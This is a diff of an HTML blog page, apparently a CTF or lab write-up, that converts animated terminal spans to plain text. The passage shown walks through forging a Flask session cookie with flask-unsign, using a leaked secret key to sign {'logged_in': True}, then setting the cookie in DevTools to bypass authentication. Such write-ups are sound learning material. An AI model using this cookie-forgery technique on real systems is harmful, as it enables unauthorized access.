@@ -368,16 +368,16 @@
                     <p>With that in mind, I downloaded <strong>flask-unsign</strong>:</p>
                     <div class="terminal-block">
                         <div class="terminal-header">root@x0n1:~$</div>
-                        <pre><code><span class="typed-terminal-line" data-text="pip3 install flask-unsign"></span></code></pre>
+                        <pre><code><span>pip3 install flask-unsign</span></code></pre>
                     </div>
                     <p>I calculated the necessary session cookie using the secret found previously in the code:</p>
                     <div class="terminal-block">
                         <div class="terminal-header">root@x0n1:~$</div>
-                        <pre><code><span class="typed-terminal-line" data-text="flask-unsign --sign --cookie &quot;{&#39;logged_in&#39;: True}&quot; --secret &#39;@09JKD0934jd712?djD&quot;&#39;"></span></code></pre>
+                        <pre><code><span>flask-unsign --sign --cookie &quot;{&#39;logged_in&#39;: True}&quot; --secret &#39;@09JKD0934jd712?djD&quot;&#39;</span></code></pre>
                     </div>
                     <p>This command generated a value like this (unique for each session):</p>
                     <div class="terminal-block">
-                        <pre><code><span class="typed-terminal-line" data-text="eyJsb2dnZWRfaW4iOnRydWV9.Z8Od8Q.i3BS-86KSi8I2aeomNSmB6QK7BI"></span></code></pre>
+                        <pre><code><span></span>eyJsb2dnZWRfaW4iOnRydWV9.Z8Od8Q.i3BS-86KSi8I2aeomNSmB6QK7BI</code></pre>
                     </div>
                     <p>Then, using <strong>DevTools</strong> on my browser, I manually created a cookie with the name
                         <code>session</code> and set its value to the output of <code>flask-unsign</code>, and its path
